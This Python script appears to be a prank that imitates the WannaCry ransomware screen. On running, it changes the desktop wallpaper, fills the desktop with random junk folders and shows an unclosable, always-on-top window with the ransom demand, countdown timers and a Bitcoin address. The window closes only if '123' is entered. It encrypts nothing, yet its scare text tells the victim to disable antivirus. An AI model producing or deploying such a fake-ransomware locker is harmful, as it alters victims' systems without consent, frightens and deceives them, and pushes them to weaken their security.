import time, ctypes, os, random, string, winreg, threading, tkinter as tk
from tkinter import ttk, scrolledtext
from datetime import datetime, timedelta
import webbrowser
from PIL import Image, ImageTk
import sys, requests

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PICTURES_DIR = os.path.join(SCRIPT_DIR, "pictures")
ASSET_URLS = {
    "BitcoinAcceptHere.jpg": "https://github.com/Delexoo/FakeGUI-Assets/raw/main/BitcoinAcceptHere.jpg",
    "WannacryLock.jpg": "https://github.com/Delexoo/FakeGUI-Assets/raw/main/WannacryLock.jpg",
    "bg.jpg": "https://github.com/Delexoo/FakeGUI-Assets/raw/main/bg.jpg",
}

GWL_STYLE, WS_CAPTION, WS_MINIMIZEBOX = -16, 0x00C00000, 0x00020000
WS_MAXIMIZEBOX, WS_SYSMENU, WS_THICKFRAME = 0x00010000, 0x00080000, 0x00040000
HWND_TOPMOST = -1
SWP_NOMOVE, SWP_NOSIZE, SWP_SHOWWINDOW = 0x0002, 0x0001, 0x0040
TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
REF_SCREEN_W, REF_SCREEN_H = 1920, 1080
REF_WINDOW_W, REF_WINDOW_H = 680, 510
UI_SIZE_BOOST = 1.12

def compute_ui_scale(screen_w, screen_h):
    scale = min(screen_w / REF_SCREEN_W, screen_h / REF_SCREEN_H) * UI_SIZE_BOOST
    return max(0.55, min(scale, 1.5))

home_dir = os.path.expanduser("~")
icon_path = os.path.join(home_dir, "Documents", "Microsoft Office 365", "icon.ico")
desktop_path = os.path.join(home_dir, 'OneDrive', 'Desktop')

def download_image(url, save_path):
    try:
        response = requests.get(url, timeout=15, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        response.raise_for_status()
        with open(save_path, 'wb') as file:
            file.write(response.content)
        return True
    except requests.exceptions.RequestException as e:
        print(f"Failed to download image: {e}")
        return False

def ensure_assets():
    os.makedirs(PICTURES_DIR, exist_ok=True)
    paths = {}
    for filename, url in ASSET_URLS.items():
        path = os.path.join(PICTURES_DIR, filename)
        if not os.path.isfile(path):
            print(f"Downloading {filename}...")
            if not download_image(url, path):
                print(f"Could not download {filename}")
        paths[filename] = path
    return paths

assets = ensure_assets()

def convert_png_to_ico(png_path, ico_path):
    img = Image.open(png_path)
    img.save(ico_path, format='ICO', sizes=[(32, 32)])

def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

def set_wallpaper_style(style):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, style)
    winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
    winreg.CloseKey(key)

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_random_folders():
    for _ in range(18):
        folder_name = generate_random_string()
        folder_path = os.path.join(desktop_path, folder_name)
        os.makedirs(folder_path, exist_ok=True)
        file_name = generate_random_string() + '.txt'
        file_path = os.path.join(folder_path, file_name)
        with open(file_path, 'w') as file:
            file.write(generate_random_string(50))

def change_wallpaper():
    time.sleep(4)
    bg_path = assets["bg.jpg"]
    if os.path.isfile(bg_path):
        set_wallpaper_style("2")
        set_wallpaper(bg_path)
        create_random_folders()
    else:
        print("Background image not found in pictures folder.")

threading.Thread(target=change_wallpaper).start()

icon_url = "https://static.vecteezy.com/system/resources/previews/011/099/591/non_2x/yellow-hand-showing-symbol-free-png.png"
png_icon_path = os.path.join(SCRIPT_DIR, "icon.png")
ico_icon_path = os.path.join(SCRIPT_DIR, "icon.ico")

if download_image(icon_url, png_icon_path):
    convert_png_to_ico(png_icon_path, ico_icon_path)

payment_raise_deadline = datetime.now() + timedelta(days=2)
files_lost_deadline = datetime.now() + timedelta(days=5)

root = tk.Tk()
root.withdraw()
root.update_idletasks()
screen_width, screen_height = root.winfo_screenwidth(), root.winfo_screenheight()
ui_scale = compute_ui_scale(screen_width, screen_height)
sc = lambda n: max(1, int(round(n * ui_scale)))

root.title("Wana Decrypt0r 2.0")
root.configure(bg="#841212")

def get_window_hwnd():
    hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
    return hwnd if hwnd else root.winfo_id()

def force_topmost():
    hwnd = get_window_hwnd()
    ctypes.windll.user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS)
    root.attributes("-topmost", True)
    root.lift()

def start_topmost_guard():
    force_topmost()
    root.after(400, start_topmost_guard)

if os.path.exists(ico_icon_path):
    try:
        root.iconbitmap(ico_icon_path)
    except Exception as e:
        print(f"Failed to set icon: {e}")
else:
    print(f"Icon not found at {ico_icon_path}")

def disable_event():
    pass

root.overrideredirect(True)
root.protocol("WM_MOVING", disable_event)
root.protocol("WM_SIZING", disable_event)

window_width = min(sc(REF_WINDOW_W), int(screen_width * 0.92))
window_height = min(sc(REF_WINDOW_H), int(screen_height * 0.92))
position_top = int(screen_height / 2 - window_height / 2)
position_right = int(screen_width / 2 - window_width / 2)
root.geometry(f"{window_width}x{window_height}+{position_right}+{position_top}")

hwnd = get_window_hwnd()
style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
style = style & ~(WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU | WS_THICKFRAME)
ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)
root.update_idletasks()
force_topmost()
start_topmost_guard()

custom_header = tk.Frame(root, bg="#D5868C", height=sc(10))
custom_header.pack(fill="x")

exit_button = tk.Button(custom_header, text="X", bg="#D5868C", fg="white", command=None, bd=0, font=("Arial", sc(10), "bold"))
exit_button.pack(side="right", padx=sc(5), pady=sc(2))

top_frame = tk.Frame(root, bg="#841212")
top_frame.pack(fill="x", pady=(2, 0))

title_label = tk.Label(top_frame, text="Ooops, your files have been encrypted!", fg="white", bg="#841212", font=("Arial", sc(12), "bold"))
title_label.pack(side="left", padx=sc(5))
title_label.pack(side="top", pady=0)

language_label = tk.Label(top_frame, text=" ", fg="white", bg="#841212", font=("Arial", sc(9), "bold"))
language_label.pack(side="right", padx=sc(3))
languages = ["English", "Español", "Deutsch", "Français", "中文"]
language_var = tk.StringVar(value=languages[0])
language_dropdown = ttk.Combobox(top_frame, values=languages, textvariable=language_var, state="readonly", width=sc(12))
language_dropdown.pack(side="right", padx=(0, sc(5)))

content_frame = tk.Frame(root, bg="#841212", bd=1, relief="sunken")
content_frame.pack(fill="both", expand=True, padx=sc(5), pady=sc(3))
content_frame.columnconfigure(0, weight=0)
content_frame.columnconfigure(1, weight=1)
content_frame.rowconfigure(0, weight=1)
content_frame.rowconfigure(1, weight=0)
content_frame.rowconfigure(2, weight=0)

lock_size = sc(120)
lock_path = assets["WannacryLock.jpg"]
try:
    im = Image.open(lock_path)
    im = im.resize((lock_size, lock_size), Image.LANCZOS)
    lock_img = ImageTk.PhotoImage(im)
except (OSError, FileNotFoundError) as e:
    print(f"Failed to load lock image: {e}")
    im = Image.new('RGB', (lock_size, lock_size), color='#841212')
    lock_img = ImageTk.PhotoImage(im)

lock_icon_label = tk.Label(content_frame, image=lock_img, bg="#841212")
lock_icon_label.image = lock_img
lock_icon_label.grid(row=0, column=0, padx=sc(40), pady=sc(5), sticky="nw")

timer_frame_h = sc(80)
pay_raise_frame = tk.Frame(content_frame, bg="#841212", bd=2, relief="groove", height=timer_frame_h)
pay_raise_frame.grid(row=1, column=0, padx=sc(5), pady=sc(5), sticky="nw")
files_lost_frame = tk.Frame(content_frame, bg="#841212", bd=2, relief="groove", height=timer_frame_h)
files_lost_frame.grid(row=2, column=0, padx=sc(5), pady=sc(5), sticky="nw")

pay_raise_frame_inner = tk.Frame(pay_raise_frame, bg="#841212")
pay_raise_frame_inner.pack(side="left", fill="both", expand=True, pady=(sc(10), 0))

files_lost_frame_inner = tk.Frame(files_lost_frame, bg="#841212")
files_lost_frame_inner.pack(side="left", fill="both", expand=True, pady=(sc(10), 0))

pay_raise_label = tk.Label(pay_raise_frame_inner, text="Payment will be raised on\n--/--/---- --:--:--\nTime Left:\n00:00:00:00", fg="white", bg="#841212", font=("Arial", sc(8), "bold"), padx=sc(3), pady=sc(3), width=sc(22), justify="center")
pay_raise_label.pack(padx=sc(3), pady=sc(1), expand=True)

files_lost_label = tk.Label(files_lost_frame_inner, text="Your files will be lost on\n--/--/---- --:--:--\nTime Left:\n00:00:00:00", fg="white", bg="#841212", font=("Arial", sc(8), "bold"), padx=sc(3), pady=sc(3), width=sc(22), justify="center")
files_lost_label.pack(padx=sc(3), pady=sc(1), expand=True)

def update_timers():
    now = datetime.now()
    def format_time(delta):
        if delta.total_seconds() < 0: return "00:00:00:00"
        days, rem = divmod(delta.seconds, 3600*24)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        return f"{days:02d}:{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    pr_diff = payment_raise_deadline - now
    pay_raise_text = f"Payment will be raised on\n{payment_raise_deadline.strftime('%m/%d/%Y %H:%M:%S')}\nTime Left:\n{format_time(pr_diff)}"
    pay_raise_label.config(text=pay_raise_text)
    
    fl_diff = files_lost_deadline - now
    files_lost_text = f"Your files will be lost on\n{files_lost_deadline.strftime('%m/%d/%Y %H:%M:%S')}\nTime Left:\n{format_time(fl_diff)}"
    files_lost_label.config(text=files_lost_text)
    
    root.after(1000, update_timers)

update_timers()

def create_gradient_bar(parent):
    bar_w, bar_h = sc(20), timer_frame_h
    gradient_canvas = tk.Canvas(parent, width=bar_w, height=bar_h, bg="#841212", bd=0, highlightthickness=0)
    gradient_canvas.pack(side="right", padx=(0, sc(5)), pady=(sc(5), sc(5)), fill="y")
    for i in range(bar_h):
        r_val = int((i / max(bar_h - 1, 1)) * 79 * 2.318)
        color = f'#{r_val:02x}{255 - r_val:02x}12'
        gradient_canvas.create_line(0, i, bar_w, i, fill=color)

create_gradient_bar(pay_raise_frame)
create_gradient_bar(files_lost_frame)

scroll_text = scrolledtext.ScrolledText(content_frame, wrap="word", width=sc(38), height=sc(12), font=("Times New Roman", sc(9)), bg="#ffffff")
scroll_text.grid(row=0, column=1, rowspan=3, padx=sc(5), pady=sc(5), sticky="nsew")

scroll_text.tag_configure("bold", font=("Times New Roman", sc(9), "bold"))
scroll_text.tag_configure("red", foreground="red")
scroll_text.tag_configure("yellow", foreground="yellow")

scroll_text.insert(tk.END, "What Happened to My Computer?\n", "bold")
scroll_text.insert(tk.END, "Your important files are encrypted.\n\n")
scroll_text.insert(tk.END, "Many of your documents, photos, videos, databases, and other files have been encrypted.\n")
scroll_text.insert(tk.END, "Maybe you are busy looking for a way to recover your files, but do not waste your time.\n")
scroll_text.insert(tk.END, "Nobody can recover your files without our decryption service.\n\n")
scroll_text.insert(tk.END, "Can I Recover My Files?\n", "bold")
scroll_text.insert(tk.END, "We guarantee you can recover your files safely and easily – but time is short.\n")
scroll_text.insert(tk.END, "You can decrypt some files for free by clicking <Decrypt>.\n")
scroll_text.insert(tk.END, "To decrypt all files, you must pay.\n\n")
scroll_text.insert(tk.END, "How Do I Pay?\n", "bold")
scroll_text.insert(tk.END, "Payment is accepted in Bitcoin only. For more information, click 'About Bitcoin'.\n")
scroll_text.insert(tk.END, "Please check the current price of Bitcoin and buy some bitcoins. For more information, click 'How to Buy Bitcoins'.\n")
scroll_text.insert(tk.END, "Send the correct amount to the address specified in this window.\n")
scroll_text.insert(tk.END, "After your payment, click <Check Payment>. Best time to check: 9:00am - 11:00am GMT from Monday to Friday.\n")
scroll_text.insert(tk.END, "Once the payment is checked, you can start decrypting your files immediately.\n\n")
scroll_text.insert(tk.END, "Contact\n", "bold")
scroll_text.insert(tk.END, "If you need our assistance, send a message by clicking <Contact Us>.\n\n")
scroll_text.insert(tk.END, "We strongly recommend you do not remove this software, and disable your anti-virus software until you pay and the payment is processed.\n", "red")
scroll_text.insert(tk.END, "If your anti-virus is updated and removes this software automatically, you will not be able to recover your files even if you pay!\n\n", "red")
scroll_text.config(state="disabled")

bottom_frame = tk.Frame(root, bg="#841212", bd=1, relief="sunken")
bottom_frame.pack(fill="x", padx=sc(5), pady=sc(3))
bottom_frame.columnconfigure(0, weight=1)
bottom_frame.columnconfigure(1, weight=1)

left_bottom = tk.Frame(bottom_frame, bg="#841212")
left_bottom.grid(row=0, column=0, sticky="w", padx=sc(5), pady=sc(3))

def open_link(url):
    webbrowser.open(url)

link_about = tk.Label(left_bottom, text="About Bitcoin", fg="cyan", bg="#841212", cursor="hand2", font=("Arial", sc(7), "underline"))
link_about.pack(anchor="w", pady=sc(1))
link_about.bind("<Button-1>", lambda e: open_link("https://bitcoin.org"))

link_buy = tk.Label(left_bottom, text="How to Buy Bitcoins", fg="cyan", bg="#841212", cursor="hand2", font=("Arial", sc(7), "underline"))
link_buy.pack(anchor="w", pady=sc(1))
link_buy.bind("<Button-1>", lambda e: open_link("https://www.investopedia.com/how-to-buy-bitcoin-4689743"))

link_contact = tk.Label(left_bottom, text="Contact Us", fg="cyan", bg="#841212", cursor="hand2", font=("Arial", sc(11), "underline"))
link_contact.pack(anchor="w", pady=sc(1))
link_contact.bind("<Button-1>", lambda e: open_link("mailto:help@ransom.fake"))

right_bottom = tk.Frame(bottom_frame, bg="#841212")
right_bottom.grid(row=0, column=1, sticky="e", padx=sc(5), pady=sc(3))

btc_frame = tk.Frame(right_bottom, bg="#841212", bd=2, relief="groove")
btc_frame.pack(anchor="e", pady=(0, 0), padx=sc(45))

btc_path = assets["BitcoinAcceptHere.jpg"]
btc_max_w, btc_max_h = sc(100), sc(40)
try:
    btc_im = Image.open(btc_path)
    btc_im.thumbnail((btc_max_w, btc_max_h), Image.LANCZOS)
except (OSError, FileNotFoundError) as e:
    print(f"Failed to load bitcoin image: {e}")
    btc_im = Image.new('RGB', (btc_max_w, btc_max_h), color='#841212')
bitcoin_img = ImageTk.PhotoImage(btc_im)
btc_image_label = tk.Label(btc_frame, image=bitcoin_img, bg="#841212")
btc_image_label.image = bitcoin_img
btc_image_label.pack(side="left", padx=(sc(5), sc(10)))

btc_label = tk.Label(btc_frame, text="Send $300 worth of bitcoin to this address:", bg="#841212", font=("Arial", sc(9)), fg="yellow")
btc_label.pack(anchor="w", padx=(0, sc(5)))

btc_addr = tk.Entry(btc_frame, width=sc(30), font=("Arial", sc(9)), justify="center", bg="#841212", fg="white")
btc_addr.insert(0, "1z9YDPgwueZ9NyMgw51gp7A8isjr6SMw")
btc_addr.pack(anchor="w", padx=(0, sc(5)), pady=sc(2))

def check_btc_input(event):
    if btc_addr.get() == "123":
        root.destroy()
        sys.exit()

btc_addr.bind("<Return>", check_btc_input)

header_label = tk.Label(custom_header, text="Wana Decrypt0r 2.0", fg="black", bg="#D5868C", font=("Arial", sc(8))).place(relx=0.5, rely=0.5, anchor="center")

buttons_frame = tk.Frame(right_bottom, bg="#841212")
buttons_frame.pack(anchor="e", pady=sc(2))

ttk.Style().configure('Bold.TButton', font=('Arial', sc(10), 'bold'))

check_btn = ttk.Button(buttons_frame, text="Check Payment", width=sc(26), style='Bold.TButton')
check_btn.pack(side="left", padx=sc(10))
decrypt_btn = ttk.Button(buttons_frame, text="Decrypt", width=sc(26), style='Bold.TButton')
decrypt_btn.pack(side="left", padx=sc(10))

try:
    root.deiconify()
    root.update_idletasks()
    force_topmost()
    root.mainloop()
except KeyboardInterrupt:
    print("Program interrupted.")
finally:
    print("Cleanup done.")

# Lol